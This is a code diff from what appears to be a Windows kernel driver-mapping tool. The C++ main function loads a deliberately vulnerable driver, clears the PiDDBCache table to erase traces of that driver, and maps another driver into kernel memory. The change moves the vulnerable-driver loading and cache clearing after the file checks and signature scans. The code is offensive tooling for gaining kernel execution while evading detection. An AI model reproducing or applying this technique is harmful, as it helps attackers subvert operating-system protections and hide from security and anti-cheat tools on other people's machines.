@@ -21,25 +21,6 @@ int main(int argument_count, char** argument_array)
 		return -1;
 	}
 
-	const auto [drv_handle, drv_key] = vdm::load_drv();
-	if (!drv_handle || drv_key.empty())
-	{
-		std::printf("[-] unable to load vulnerable driver\n");
-		return -1;
-	}
-
-	std::printf("[+] vulnerable driver loaded [%s]\n", drv_key.c_str());
-
-	vdm::vdm_ctx kernel{};
-
-	if (!kernel.clear_piddb_cache(drv_key, util::get_file_header((void*)vdm::raw_driver)->TimeDateStamp))
-	{
-		std::printf("[-] failed to clear piddbcache table\n");
-		vdm::unload_drv(drv_handle, drv_key);
-
-		return -1;
-	}
-
 	std::ifstream drv_buffer_str(argument_array[1], std::ios::binary);
 	std::vector<std::uint8_t>drv_buffer(std::istreambuf_iterator<char>(drv_buffer_str), {});
 
@@ -48,8 +29,6 @@ int main(int argument_count, char** argument_array)
 	if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
 	{
 		std::printf("[-] invalid nt signature of target file\n");
-		vdm::unload_drv(drv_handle, drv_key);
-
 		return -1;
 	}
 
@@ -60,8 +39,6 @@ int main(int argument_count, char** argument_array)
 	if (signed_driver.number_of_sections == 0)
 	{
 		std::printf("[-] failed to get info for potential driver.\n");
-		vdm::unload_drv(drv_handle, drv_key);
-
 		return -1;
 	}
 
@@ -71,8 +48,6 @@ int main(int argument_count, char** argument_array)
 	if ((load_status != STATUS_SUCCESS && load_status != 0x1) || !signed_module_base)
 	{
 		printf("[-] failed to load [%s] [0x%x]\n", signed_driver.file_name.c_str(), load_status);
-		vdm::unload_drv(drv_handle, drv_key);
-
 		return -1;
 	}
 
@@ -90,6 +65,23 @@ int main(int argument_count, char** argument_array)
 	if (!mm_pte_offset || !mm_pde_offset)
 	{
 		printf("[-] failed to sig scan pte functions\n");
+		return -1;
+	}
+	
+	const auto [drv_handle, drv_key] = vdm::load_drv();
+	if (!drv_handle || drv_key.empty())
+	{
+		std::printf("[-] unable to load vulnerable driver\n");
+		return -1;
+	}
+
+	std::printf("[+] vulnerable driver loaded [%s]\n", drv_key.c_str());
+
+	vdm::vdm_ctx kernel{};
+
+	if (!kernel.clear_piddb_cache(drv_key, util::get_file_header((void*)vdm::raw_driver)->TimeDateStamp))
+	{
+		std::printf("[-] failed to clear piddbcache table\n");
 		vdm::unload_drv(drv_handle, drv_key);
 
 		return -1;
